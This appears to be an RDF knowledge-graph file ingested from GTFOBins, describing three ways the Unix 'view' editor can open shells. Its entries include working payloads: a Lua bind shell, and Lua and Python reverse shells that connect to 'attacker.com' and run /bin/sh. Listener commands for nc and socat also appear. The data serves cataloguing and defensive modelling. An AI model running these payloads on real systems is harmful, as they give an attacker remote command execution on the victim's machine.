mknd:command_view-non-interactive-bind-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "view-non-interactive-bind-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed." ;
    d3f:uses mknd:executable_view ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_view ;
    mknd:provides mknd:function_non-interactive-bind-shell ;
    mknd:value """export LPORT=12345
view -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
""" .

mknd:command_view-non-interactive-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "view-non-interactive-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed." ;
    d3f:uses mknd:executable_view ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_view ;
    mknd:provides mknd:function_non-interactive-reverse-shell ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
view -c ':lua local s=require("socket"); local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
""" .

mknd:command_view-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "view-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell." ;
    d3f:uses mknd:executable_view ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_view ;
    mknd:provides mknd:function_reverse-shell ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
view -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
""" .

